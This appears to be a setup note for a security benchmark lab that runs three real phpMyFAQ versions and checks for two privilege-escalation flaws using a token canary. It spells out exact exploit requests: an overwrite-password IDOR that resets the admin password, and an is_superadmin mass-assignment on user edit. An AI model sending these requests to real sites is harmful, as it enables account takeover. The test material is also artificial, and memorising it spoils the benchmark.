================================================================================
WHAT RUNS
================================================================================
Three FULL, REAL phpMyFAQ installations (no source lift, no shim):
  - Each app image: git clone github.com/thorsten/phpMyFAQ at the version tag, `composer install`,
    PHP 8.3 + Apache/mod_php. phpMyFAQ serves its OWN Symfony routing / Api\UserController.
  - One MariaDB 11 container, one database per version (pmf_v0 / pmf_v1 / pmf_v2).
  - Installed at first boot by POSTing phpMyFAQ's REAL web installer: POST /setup/index.php/install.
  - Seeded (pcb_seed.php, using phpMyFAQ's own User/Configuration APIs): a low-privilege user
    administrator 'editor' (add_user+edit_user+delete_user, NOT SuperAdmin, NOT editconfig).
Versions / ports:
  v0 = 4.1.2  http://127.0.0.1:40560   (overwritePassword unguarded)
  v1 = 4.1.3  http://127.0.0.1:40561   (CVE-2026-35671 fix: overwritePassword guarded; siblings open) <- TARGET
  v2 = 4.1.4  http://127.0.0.1:40562   (CVE-2026-56396 fix: editUser/updateUserRights guarded)

================================================================================
BENIGN AUTHZ CANARY
================================================================================
Flag = phpMyFAQ's REAL REST-API client token, config item `api.apiClientToken` = ${PCB_FLAG}.
Read channel (phpMyFAQ's OWN endpoint, gated by PermissionType::CONFIGURATION_EDIT):
    GET /admin/api/configuration/list/api   -> renders api.apiClientToken's value into the HTML.
Only a SuperAdmin (SuperAdmin short-circuits hasPermission() -> true) or an editconfig holder may
read it. 'editor' holds neither -> 403 at baseline. Reaching the token proves the low-priv actor
escalated across the privilege boundary the CVE-2026-35671 fix defends.

================================================================================
EXTERNAL-HTTP ATTACK (exactly what oracle.py drives)
================================================================================
Every probe: GET /pcb_reset.php (fixture reset) -> POST /admin/authenticate (faqusername=editor&
faqpassword=...) -> GET /admin/user/edit/2 (scrape phpMyFAQ's real page CSRF tokens + cookies) ->
POST the user-admin sink (JSON + scraped csrf) -> read the SuperAdmin-only token.

ORIGINAL (CVE-2026-35671, overwritePassword IDOR, mode=takeover):
    POST /admin/api/user/overwrite-password  {"userId":1,"newPassword":"PwnedByEditor_2026",
        "passwordRepeat":"PwnedByEditor_2026","csrf":<overwrite-password token>}
    then POST /admin/authenticate as admin/PwnedByEditor_2026, then GET the token endpoint.

RESIDUAL (CVE-2026-56396, editUser is_superadmin mass-assign, mode=self_escalate):
    POST /admin/api/user/edit  {"userId":2,"is_superadmin":"1","display_name":"Editor",
        "email":"editor@example.test","user_status":"active","last_modified":"2026-01-01 00:00:00",
        "overwrite_twofactor":"off","csrfToken":<update-user-data token>}
    then GET the token endpoint with the SAME (now-SuperAdmin) editor session.

